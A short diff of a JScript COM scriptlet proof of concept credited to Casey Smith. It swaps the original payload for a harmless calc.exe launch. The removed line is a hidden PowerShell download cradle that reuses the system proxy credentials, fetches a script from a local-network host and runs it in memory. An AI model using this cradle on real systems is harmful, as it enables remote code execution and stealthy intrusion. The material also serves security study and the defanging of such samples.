@@ -1,12 +1,12 @@
 <?XML version="1.0"?>
   <scriptlet>
-    <registration 
+    <registration     
       progid="PoC"
-      classid="{F0001111-0000-0000-0000-0000FEEDACDC}" > 
-     <!-- Proof Of Concept - Casey Smith @subTee --> 
-     <!--  License: BSD3-Clause --> 
-      <script language="JScript"> 
-        <![CDATA[ var r = new ActiveXObject("WScript.Shell").Run("powershell.exe -nop -w hidden -c $I=new-object net.webclient;$I.proxy=[Net.WebRequest]::GetSystemWebProxy();$I.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $I.downloadstring('http://192.168.88.1:8080/3Xymmp');"); ]]>
+      classid="{F0001111-0000-0000-0000-0000FEEDACDC}" >
+      <!-- Proof Of Concept - Casey Smith @subTee -->
+      <!--  License: BSD3-Clause -->
+     <script language="JScript">
+       <![CDATA[ var r = new ActiveXObject("WScript.Shell").Run("calc.exe"); ]]>
      </script>
    </registration>
-  </scriptlet>
+ </scriptlet>
